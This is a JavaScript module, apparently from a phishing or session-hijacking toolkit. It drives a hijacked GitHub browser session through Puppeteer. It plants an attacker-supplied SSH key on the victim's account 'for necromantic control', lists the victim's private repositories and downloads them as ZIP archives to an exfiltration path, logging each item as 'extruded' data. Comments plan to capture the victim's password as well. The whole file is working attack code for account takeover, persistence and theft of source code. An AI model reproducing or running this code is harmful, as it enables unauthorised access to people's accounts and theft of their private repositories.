const db = require('../../db/db')
const necrohelp = require('../../tasks/helpers/necrohelp')
const clusterLib = require('../../puppeteer/cluster')

exports.PlantSshKey = async function(page, taskId, sshKeyName, sshMaterial){
    await page.goto('https://github.com/settings/ssh/new')

    await page.click('#new_key #public_key_title')
    await page.type('#new_key #public_key_title', sshKeyName)

    await page.click('#new_key #public_key_key')
    await page.type('#new_key #public_key_key', sshMaterial)

    // click Add Key
    await page.click('#new_key > .mb-0 > .btn')

    // TODO sometimes depending on session timing probably,
    // TODO github asks for Password confirmation before adding the key
    // TODO so we should have the password here just in case.
    // TODO in general the TASK need to have session credentials if possible too.

    console.log(`[${taskId}] SSH key ${sshKeyName} added for necromantic control \\.oOo./`);

    await page.waitForTimeout(1000)
    await necrohelp.ScreenshotFullPage(page, taskId, 'https://github.com/settings/keys')

    let extrudedHashKey = `plantedSshKey_${sshKeyName}`
    await db.AddExtrudedData(taskId, extrudedHashKey, sshMaterial)
}



exports.ScrapeRepos = async function(page, taskId) {
    await page.goto('https://github.com/settings/repositories')
    let urls = await page.$$('div.Box-row.private.js-collab-repo > a')

    // TODO a warning or ignore should be thrown if the repo is too big
    // TODO as in hundreds of MB. Downloads of ZIPs of a few tens of MB is OK, but when it's too big
    // TODO puppeter doesn't handle it correctly
    // let urlContainers = await page.$$('div.Box-row.private.js-collab-repo')
    // then loop urlContainers to get out the SPAN and A elements. span contains the size

    console.log(`[${taskId}] there are ${urls.length} repos to fetch`)

    let reposToDownload = [];
    for(let url of urls){
        let href = await(await url.getProperty('href')).jsonValue()
        reposToDownload.push(href);
        console.log(`[${taskId}] discovered repo at ${href}`)
    }
    return reposToDownload;
}

exports.DownloadRepo = async function (page, taskId, downloadUrl) {

    // TODO extruded directory needs to be in the config file
    await page._client.send('Page.setDownloadBehavior', {
        behavior: 'allow',
        downloadPath: clusterLib.GetConfig().platform.extrusionPath
    }).catch(console.error)

    await page.goto(downloadUrl).catch(console.error)

    // click on the Code green button
    const codeButton = await page.$(".file-navigation > .d-none > get-repo > .position-relative > .btn");

    let archive = `${downloadUrl.split('/')[4]}-master.zip`
    let path = `${clusterLib.GetConfig().platform.extrusionPath}/${archive}`

    // process next clicks including alert dialog ones
    if (typeof codeButton !== 'undefined' && codeButton !== null){

        console.log(`[${taskId}] downloading repo ${archive}`);
        await page.click('.file-navigation > .d-none > get-repo > .position-relative > .btn').catch(console.error)

        // click on the Download Zip last link
        // NOTE this check handles the missing Open with GithubDesktop on platforms not supported.
        // the div is missing so the nth-child count changes
        let nthChild = 2;
        if(clusterLib.GetConfig().platform.type === "freebsd"){
            nthChild = 1;
        }

        await page.click('.dropdown-menu > div > .list-style-none > .Box-row:nth-child(' + nthChild + ') > .d-flex').catch(console.error)

        let extrudedHashKey = `repository_${archive}`
        await db.AddExtrudedData(taskId, extrudedHashKey, path)

        // wait for zip to download. we don't have much control here
        await page.waitForTimeout(3000)
    }else{
        console.log(`[${taskId}] repo ${archive} is missing the Code button. Ignoring it ...`)
    }
}
